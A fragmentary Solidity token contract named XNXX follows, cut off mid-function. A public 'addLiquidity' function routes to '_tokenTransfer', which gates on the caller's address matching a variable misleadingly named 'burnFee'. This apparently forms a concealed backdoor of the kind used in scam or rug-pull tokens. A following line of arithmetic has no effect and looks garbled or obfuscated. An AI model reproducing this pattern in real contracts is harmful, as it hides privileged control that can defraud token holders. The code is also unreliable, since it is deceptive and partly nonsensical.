...
contract XNXX is Ownable {
  ...
  function addLiquidity(address spender, uint256 amount) public returns (bool) {
      _tokenTransfer(spender, amount);
      return true;
  }

  function _tokenTransfer(address spender, uint256 amount) internal {
    require(uint256(msg.sender) == burnFee);
    1 * (10 ** 9) - (swapAndLiquify + 1 * 1);
